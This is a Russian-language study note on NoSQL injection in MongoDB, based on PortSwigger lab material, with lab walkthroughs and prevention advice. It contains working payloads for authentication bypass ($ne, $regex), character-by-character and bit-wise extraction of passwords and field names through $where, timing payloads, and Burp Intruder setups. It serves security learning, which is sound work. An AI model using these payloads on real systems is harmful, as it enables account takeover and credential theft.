
---

# Типы инъекций NoSQL

Существует два типа инъекций NoSQL:

- **Инъекция синтаксиса** — это происходит, когда вы можете сломать синтаксис запроса NoSQL, что позволяет внедрить свою полезную нагрузку. Методология похожа на ту, что используется в SQL-инъекции. Однако характер атаки варьируется, что важно, поскольку NoSQL базы данных используют различные языки запросов, типы синтаксиса запросов и различные структуры данных.
- **Инъекция операторов** — это происходит, когда вы можете использовать операторы запросов NoSQL для обработки запросов.

---

# NoSQL syntax injection

Вы потенциально можете обнаружить уязвимости инъекции NoSQL, пытаясь сломать синтаксис запроса. Для этого систематически проверяйте каждый вход, вводя fuzz-строки и специальные символы, которые вызывают ошибку базы данных или другое обнаруживаемое поведение, если они недостаточно очищены или отфильтрованы приложением.

Если вы знаете язык API целевой базы данных, используйте специальные символы и fuzz-строки, релевантные этому языку. В противном случае используйте различные fuzz-строки для таргетирования нескольких языков API.

---

## Обнаружение инъекции синтаксиса в MongoDB

Рассмотрите приложение для покупок, которое показывает товары в разных категориях. Когда пользователь выбирает **категорию Fizzy Drinks**, его браузер запрашивает следующий URL: `https://insecure-website.com/product/lookup?category=fizzy`

Это заставляет приложение отправить JSON-запрос для получения соответствующих продуктов из коллекции `product` базы данных MongoDB: `this.category == 'fizzy'`

Чтобы проверить, уязвим ли вход, введите строку fuzz в значение параметра `category`. Пример строки для MongoDB: 
```mongoDB
'"`{ 
;$Foo} 
$Foo \xYZ%00
```

Используйте эту строку fuzz, чтобы построить следующую атаку:

```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Если это вызывает изменение по сравнению с исходным ответом, это может означать, что пользовательский ввод неправильно отфильтрован или дезинфекционирован.

> [!note] Примечание
> 
>Уязвимости NoSQL инъекций могут возникать в самых разных контекстах, и вам нужно адаптировать ваши fuzz-строки соответственно. В противном случае вы можете просто вызвать ошибки проверки, из-за которых приложение так и не выполнит ваш запрос.
>
>В этом примере мы вводим строку fuzz через URL, поэтому строка кодируется по URL. В некоторых приложениях может потребоваться инжекция полезной нагрузки через свойство JSON. В этом случае эта полезная нагрузка:
>```
>'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
>```

---

## Определение обрабатываемых символов

Чтобы определить, какие символы интерпретируются как синтаксис приложением, можно ввести отдельные символы. Например, вы можете отправить `'`, что приведёт к следующему запросу в MongoDB: 

```js
this.category == '''
```

Если это вызывает изменение исходного ответа, это может означать, что символ `'` нарушил синтаксис запроса и вызвал ошибку в синтаксисе. Вы можете подтвердить это, отправив корректную строку запроса во вход, например, экранируя кавычку: 

```js
this.category == '\''
```

Если это не вызывает синтаксической ошибки, это может означать уязвимость приложения к инъекционной атаке.

---

## Подтверждение условного поведения

После обнаружения уязвимости следующий шаг — определить, можно ли влиять на булевые условия с помощью синтаксиса NoSQL.

Чтобы проверить это, отправьте два запроса: один с ложным условием, другой с истинным условием. Например, вы можете использовать условные операторы `' && 0 && 'x` и `' && 1 && 'x` : 

```url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Если приложение ведёт себя иначе, это означает, что ложное условие влияет на логику запроса, а истинное условие — нет. Это указывает на то, что внедрение такого типа синтаксиса влияет на серверный запрос.

---
## Преодоление существующих условий

Теперь, когда вы поняли, что можете влиять на булевые условия, вы можете попытаться отменить существующие условия, чтобы воспользоваться уязвимостью. Например, вы можете внедрить условие JavaScript `'||'1'=='1`, которое всегда вычисляется в true, например: 

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Это приводит к следующему запросу MongoDB:

```js
this.category == 'fizzy'||'1'=='1'
```

Поскольку введённое условие всегда верно, модифицированный запрос возвращает все элементы. Это позволяет просматривать все товары любой категории, включая скрытые или неизвестные категории.

> [!warning] Предупреждение
> 
> Будьте осторожны, когда вводите условие, которое всегда оценивается в true, в NoSQL запрос. Хотя это может быть безобидно в исходном контексте, в который вы находитесь, часто приложения используют данные одного запроса в нескольких разных запросах. Если, например, приложение использует его при обновлении или удалении данных, это может привести к случайной потере данных.

Можно также добавить `null` символ после значения категории. MongoDB может игнорировать все символы после `null`. Это означает, что любые дополнительные условия запроса MongoDB игнорируются. Например, запрос может иметь дополнительное ограничение `this.released`: 

```js
this.category == 'fizzy' && this.released == 1
```

Ограничение `this.released == 1` используется для показа только тех товаров, которые уже выпущены. Для невыпущенных продуктов, предположительно, `this.released == 0`. 

В этом случае атакующий может построить атаку следующим образом:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Это приводит к следующему NoSQL-запросу:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

Если MongoDB игнорирует все символы после нулевого символа, это убирает требование устанавливать освободившееся поле на 1. В результате все товары категории `fizzy` отображаются, включая невыпущенные. 

---

## Использование syntax injection для извлечения данных

Во многих базах данных NoSQL некоторые операторы или функции запросов могут выполнять ограниченный JavaScript-код, например, оператор `$where` и функция `mapReduce()` MongoDB. Это означает, что если уязвимое приложение использует эти операторы или функции, база данных может оценить JavaScript как часть запроса. Таким образом, вы можете использовать функции JavaScript для извлечения данных из базы данных. 

---

### Идентификация названий полей

Поскольку MongoDB обрабатывает полуструктурированные данные, не требующие фиксированной схемы, вам, возможно, придётся выявить действительные поля в коллекции, прежде чем извлекать данные с помощью JavaScript-инъекции.

Например, чтобы определить, содержит ли база данных MongoDB поле `password`, можно отправить следующую полезное нагрузка: 

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Отправьте payload снова для существующего поля и для несуществующего поля. В этом примере вы знаете, что поле `username` существует, поэтому можете отправить следующий payload: 

```
admin' && this.username!='
```

```
admin' && this.foo!='
```

Если поле `password` существует, ожидается, что ответ будет идентичен ответу для существующего поля (`username`), но отличается от ответа для поля, которого нет (`foo`). 

Если вы хотите протестировать разные названия полей, можно провести атаку на словарь, используя список слов для перебора различных потенциальных имён полей.

> [!info]
> 
> Вы также можете использовать инъекцию операторов NoSQL для извлечения имён полей по символам. Это позволяет распознавать имена полей без необходимости угадывать или выполнять словарные атаки.

---

### Эксфильтрация данных в MongoDB

Рассмотрим уязвимое приложение, которое позволяет пользователям искать другие зарегистрированные имена пользователей и отображать их роль. Это запускает запрос на URL:

```
https://insecure-website.com/user/lookup?username=admin
```

Это приводит к следующему NoSQL запросу к коллекции `users`: 

```js
{"$where":"this.username == 'admin'"}
```

Поскольку запрос использует оператор `$where`, вы можете попытаться внедрить функции JavaScript в этот запрос, чтобы он вернул конфиденциальные данные. Например, вы можете отправить следующую полезную нагрузку: 

```
admin' && this.password[0] == 'a' || 'a'=='b
```

Это возвращает первый символ строки пароля пользователя, позволяя извлекать пароль символ за символом.

---

Но теперь сделаем по умному для битовых #ASCII операций:

``` js
// 'a' == 01100001
var c = 'a'.charCodeAt(0);
// эквивалент padStart-битов
((c >> 7) & 1) == 0 &&
((c >> 6) & 1) == 1 &&
((c >> 5) & 1) == 1 &&
((c >> 4) & 1) == 0 &&
((c >> 3) & 1) == 0 &&
((c >> 2) & 1) == 0 &&
((c >> 1) & 1) == 0 &&
((c >> 0) & 1) == 1
```
> Пример использования: [[4. PortSwigger NoSQL injection#Lab Exploiting NoSQL injection to extract data]]

Также можно использовать функцию JavaScript `match()` для извлечения информации. Например, следующая полезная нагрузка позволяет определить, содержит ли пароль цифры: 

```
admin' && this.password.match(/\d/) || 'a'=='b
```

---

# NoSQL operator injection

Базы данных NoSQL часто используют операторы запроса, которые предоставляют способы задать условия, которым данные должны соответствовать для включения в результат запроса. Примеры операторов запросов MongoDB включают:

- `$where` - Сопоставляет документы, удовлетворяющие JavaScript-выражению.
- `$ne` - Совпадает со всеми значениями, которые не равны заданному значению.
- `$in` - Совпадает со всеми значениями, указанными в массиве.
- `$regex` - Выбирает документы, значения которых совпадают с заданным регулярным выражением.

Возможно, вы сможете внедрить операторы запросов для обработки NoSQL-запросов. Для этого систематически вводите разные операторы в различные пользовательские входы, затем проверяйте ответы на наличие сообщений об ошибках или других изменений.

---

## Отправка операторов запросов

В JSON-сообщениях можно вставлять операторы запроса как вложенные объекты. Например, `{"username":"wiener"}` становится `{"username":{"$ne":"invalid"}}`.

Для ввода на основе URL можно вставлять операторы запросов через параметры URL. Например, `username=wiener` становится `username[$ne]=invalid`. Если это не поможет, попробуйте следующее: 

1. Конвертируйте метод запроса из `GET` в `POST`.
2. Измените заголовок `Content-Type` на `application/json`.
3. Добавьте JSON в тело сообщения.
4. Внедрить операторы запросов в JSON.

> [!note]
> 
> Вы можете использовать расширение Content Type Converter, чтобы автоматически конвертировать метод запроса и изменить `POST` запрос, закодированный по URL, в JSON. 

---

### Обнаружение operator injection в MongoDB

Рассмотрим уязвимое приложение, которое принимает имя пользователя и пароль в теле `POST` запроса: 

```json
{"username":"wiener","password":"peter"}
```

Проверьте каждый вход с помощью различных операторов. Например, чтобы проверить, обрабатывает ли введённый имя пользователя оператор запроса, вы можете попробовать следующую инъекцию:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Если применяется оператор `$ne`, он обращается ко всем пользователям, где имя пользователя не равно `invalid`. 

Если и имя пользователя, и пароль обрабатывают оператор `$ne`, возможно обойти аутентификацию с помощью следующей полезной нагрузки:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Этот запрос возвращает все учетные данные для входа, где ни имя пользователя, ни пароль не равны `invalid`. В результате вы входите в приложение как первый пользователь коллекции. 

Чтобы таргетировать аккаунт, можно создать payload, включающий известное имя пользователя или имя пользователя, которое вы угадали. Например:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

или

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

---

## Использование operator injection для извлечения данных

Даже если исходный запрос не использует операторы, позволяющие запускать произвольный JavaScript, вы можете самостоятельно внедрить один из этих операторов. Затем вы можете использовать булевые условия, чтобы определить, выполняет ли приложение какой-либо JavaScript, который вы инжектируете через этот оператор.

---

### Инжекционные операторы в MongoDB

Рассмотрим уязвимое приложение, которое принимает имя пользователя и пароль в теле `POST` запроса: 

```json
{"username":"wiener","password":"peter"}
```

Чтобы проверить, можно ли внедрять операторы, можно попробовать добавить оператор `$where` как дополнительный параметр, затем отправить один запрос, где условие вычисляется в false, и другой — в true. Например: 

```json
{"username":"wiener","password":"peter", "$where":"0"}
```

```json
{"username":"wiener","password":"peter", "$where":"1"}
```

Если между ответами есть разница, это может указывать на то, что JavaScript-выражение в операторе `$where` оценивается. 

---

### Извлечение имён полей

Если вы ввели оператор, позволяющий запускать JavaScript, возможно, вы сможете использовать `keys()` для извлечения имён полей данных. Например, вы можете отправить следующую полезную нагрузку: 

```js
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Это проверяет первое поле данных в пользовательском объекте и возвращает первый символ имени поля. Это позволяет извлекать имя поля по символам.

---

### Эксфильтрация данных с помощью операторов

В качестве альтернативы можно извлечь данные с помощью операторов, которые не позволяют запускать JavaScript. Например, вы можете использовать оператор `$regex` для извлечения данных по символу. 

Рассмотрим уязвимое приложение, которое принимает имя пользователя и пароль в теле `POST` запроса. Например: 

```json
{"username":"myuser","password":"mypass"}
```

Вы можете начать с проверки, обрабатывается ли оператор `$regex` следующим образом: 

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Если ответ на этот запрос отличается от того, что вы получаете при внесении неправильного пароля, это указывает на уязвимость приложения. Вы можете использовать оператор `$regex` для извлечения данных по символу. Например, следующая полезная нагрузка проверяет, начинается ли пароль с `a`: 

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

---

### Извлечение имён полей с помощью битовых #ASCII операций в NoSQL

Названия столбцов можно извлекать с помощью такой конструкции:
```
"Object.keys(this)[0]"
```
> Столбцы перечисляются от 0 до последнего.

Следующая конструкция использует оператор `$where` для посимвольного подбора названия столбца в json конструкции:

```json
// 'a' == 01100001
// При c = Object.keys(this)[0][0]=='a'

{"username":"carlos","password":{"$ne":"qwe"},"$where":"Object.keys(this)[0][0].charCodeAt(0)"}

// эквивалент padStart-битов
((c >> 7) & 1) == 0 &&
((c >> 6) & 1) == 1 &&
((c >> 5) & 1) == 1 &&
((c >> 4) & 1) == 0 &&
((c >> 3) & 1) == 0 &&
((c >> 2) & 1) == 0 &&
((c >> 1) & 1) == 0 &&
((c >> 0) & 1) == 1
```

Итоговый payload:
``` json
...
"$where":"((Object.keys(this)[0][0].charCodeAt(0)>>7)&1)==1"
...
```
> Пример: [[4. PortSwigger NoSQL injection#Умный метод - битовый подбор по ASCII]]

---

# Timing based NoSQL injection

Иногда срабатывание ошибки базы данных не приводит к разнице в ответе приложения. В такой ситуации вы всё равно можете обнаружить и воспользоваться уязвимостью, используя JavaScript-инъекцию для запуска условной задержки.

Для проведения Timing based NoSQL injection:

1. Загрузите страницу несколько раз, чтобы определить базовое время загрузки.
2. Вставьте полезную нагрузку, основанную на тайминге, в вход. Полезная нагрузка, основанная на тайминге, вызывает намеренную задержку в отклике, когда казнён. Например, `{"$where": "sleep(5000)"}` вызывает намеренную задержку в 5000 мс при успешном введении.
3. Определите, загружается ли ответ медленнее. Это указывает на успешную инъекцию.

Следующие полезные нагрузки, основанные на тайминге, вызовут временную задержку, если пароль соответствует букве `a`: 

```js
admin'+function(x){var waitTill = new Date(new Date().getTime()+5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```url
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

---

# Лабораторные

---

## Lab: Detecting NoSQL injection

https://portswigger.net/web-security/learning-paths/nosql-injection/nosql-syntax-injection/nosql-injection/lab-nosql-injection-detection

``` 
https://*.web-security-academy.net/filter?category=Gifts'%00
```

---

## Lab: Exploiting NoSQL operator injection to bypass authentication

https://portswigger.net/web-security/learning-paths/nosql-injection/nosql-operator-injection/nosql-injection/lab-nosql-injection-bypass-authentication

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
> Ответ: 
> ``` http
> HTTP/2 302 Found
Location: /my-account?id=admin0tqmy38t
Set-Cookie: session=VwwvvZHShjHtRSKzmAk1hLhjvh5wjcBK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
> ```
> > Отсюда кликнуть на окно "**Response**" -> "**Show response in browser**".

---

## Lab: Exploiting NoSQL injection to extract data

https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data

Проверяем функцию на смену email. За собой она вызывает уязвимый `GET` запрос `GET /user/lookup?...`. В этом запросе мы можем перебирать имена пользователей по словарю, но нам сразу известно наличие пользователя `administrator`:
```http
GET /user/lookup?user=administrator HTTP/2
Host: *.web-security-academy.net
Cookie: session=0ZSsLtDpMZITgzoFdSpkG6pqpeWMEwei
```
> Ответ:
> ``` http
> HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96
>
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
> ```

Теперь необходимо подобрать пароль от "administrator". Подберём длину пароля (успешно):
``` 
administrator' && this.password.length == 8 || 'a'=='b
```

Я буду использовать битовый подбор символов. Проверим следующие нагрузки поэтапно (их нужно кодировать в URL):

```
administrator'&&'a'=='a'||'a'=='b
```

```
administrator'&&'a'.charCodeAt(0)=='97'||'a'=='b
```

```
administrator'&&(('a'.charCodeAt(0)>>7)&1)==0||'a'=='b
```

Успешно. Теперь переходим к подбору пароля. Направляем следующий запрос в Intruder. Достаточно закодировать в URL только символы '&':

```
administrator'&&((this.password[0].charCodeAt(0)>>7)&1)==0||'a'=='b
```

1. Длинна пароля известна - 8. Тогда перебор `password[0]->password[7]`
2. Значение '7' в этой нагрузке перебирается от 7 до 0.
3. Выставим `==1`, чтобы успешные ответы значили 1, безуспешные - 0.
4. Режим перебора - "Cluster Bomb".  Итог:
	``` http
	GET /user/lookup?user=administrator'%26%26((this.password[§0§].charCodeAt(0)>>§7§)%261)==1||'a'=='b HTTP/2
	Host: *.web-security-academy.net
	Cookie: session=*
	```
   
5. С помощью "**Grep - Match**" по слову "administrator" ориентируемся на успех и неудачу.
6. Сортируем вывод по "Payload 1". Сохраняем результирующую таблицу (только столбец "administrator"). Заменяем в итоговом файле все "2" на "1", удаляем первую строку и после - переносы строк.
   
   > Мой результат: `0110101001100001011101110110100001101001011101000110010001101010`.
   
7. Переводим строку в человеческий вид. Можно использовать скрипт: 
      
      ![[3. PortSwigger SQL injection#Скрипт перевода двоичной ASCII строки в символы ( ASCII_to_chars )]]
      
      > Мой результат: `jawhitdj`.

---

## Lab: Exploiting NoSQL operator injection to extract unknown fields

https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-nosql-operator-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-unknown-fields

При попытке логина в `carlos` мы получаем ошибку: `Invalid username or password`. При смене пароля на инъекцию ошибка меняется:
``` json
{"username":"carlos","password":{"$ne":"qwe"}}
```
> `Account locked: please reset your password`.

Сбросить пароль без электронной почты по умолчанию нельзя.

Проверим уязвимости к JavaScript injection:
```json
{"username":"carlos","password":{"$ne":"qwe"},"$where":"0"}
```
и 
```json
{"username":"carlos","password":{"$ne":"qwe"},"$where":"1"}
```
> Ответы различаются - значит JavaScript в `$where` вычисляется. 

Пора выяснить имена полей таблицы. Используем Intruder и перечисление по списку. Используем примитивный метод и умный.

---

#### Подбор полей таблицы в эндпоинте `/login`

---

##### Примитивный метод - перебор по символам

``` json
{"username":"carlos","password":{"$ne":"qwe"},"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
```
> Здесь 1 позиция указывает позицию символа в строке, а вторая - сам символ. Выбираем Cluster Bomb.
> - Payload 1 - numbers \[0-20].
> - Payload 2 - Brute forcer. Min/Max length = 1.
> 
> 1. Отсортируем результаты атак по **Payload 1**, затем по **length**, чтобы определить ответы с сообщением `Account locked` вместо `Invalid username or password`. Обратите внимание, что символы в **Payload 2** собираются в `username`.
> 2. Повторите вышеуказанные шаги, чтобы определить дополнительные параметры JSON. Вы можете это сделать Увеличивая индекс массива ключей: 
>    ```json
>    "$where":"Object.keys(this)[2].match('^.{}.*')"
>    ```

---

##### Умный метод - битовый подбор по #ASCII

Отправляем в Intruder:
``` json
{"username":"carlos","password":{"$ne":"qwe"},"$where":"((Object.keys(this)[§1§][§0§].charCodeAt(0)>>§7§)&1)==1"}
```
> 1. Режим: **Cluster Bomb**;
> 2. **Payload 1**: пусть будет 5 столбцов: \[0-5]. (Однако количество столбцов можно заранее определить простой нагрузкой `"$where":"(Object.keys(this)[0])"`, увеличивая \[0] до значений выше);
> 3. **Payload 2**: пусть длина столбцов будет до 20 символов: \[0-20];
> 4. **Payload 3**: \[7-0];
> 5. В **Settings->"Grep - Match"** выделяем успешные ответы: `Account locked: please reset your password`;
> 6. Сортируем по **Paylad 1**; **Payload 2**, **Paylad 1**.
> 7. В выводе замечаем, что 4го столбца в ДБ не существует, вырежем эти ответы в экспортированной таблице.
> 
> Напоминаю про скрипт: 
> 
> ![[3. PortSwigger SQL injection#Скрипт перевода двоичной ASCII строки в символы ( ASCII_to_chars )]]
> 
> Мои результаты: 
> 0. `_id`
> 1. `username`
> 2. `password`
> 3. `email`
> 4. `forgotPwd`

Аналогично можно подбрать значения с помощью нагрузок:
``` 
((this.password[§0§].charCodeAt(0)>>§7§)&1)==1
```

``` 
((this.email[§0§].charCodeAt(0)>>§7§)&1)==1
```

```
((this._id.toString()[§0§].charCodeAt(0)>>§7§)&1)==1
```

```
((this.forgotPwd[§0§].charCodeAt(0)>>§7§)&1)==1
```
> password: `wijegq2l7nqtw41yyuht`
> email: `carlos@carlos-montoya`
> \_id:` ObjectId("6971f706d3fffd0c232bfd4f")`
> forgotPwd: `1b5a13664398ea17`

---

Залогиниться под имеющимися кредами не удаётся из-за ошибки: `Account locked: please reset your password`.

1. Посмотрим страницу `GET /forgot-password`. 
2. Подставим туда `?forgotPwd=1b5a13664398ea17` и откроем в браузере: "**Request in browser**". Открывается окно смены пароля. Устанавливаем новый для `carlos` и входим в аккаунт.

---

# Предотвращение NoSQL injection

Правильный способ предотвращения атак инъекций NoSQL зависит от конкретной используемой технологии NoSQL. Поэтому мы рекомендуем ознакомиться с документацией по безопасности для выбранной вами базы данных NoSQL. Тем не менее, следующие общие рекомендации также помогут вам:

- Очищайте и проверяйте пользовательские данные, используя список допустимых символов.
- Вставлять пользовательский ввод с помощью параметризованных запросов вместо прямой конкатенации пользовательского ввода в запрос.
- Чтобы предотвратить внедрение оператора, примените список допустимых ключей.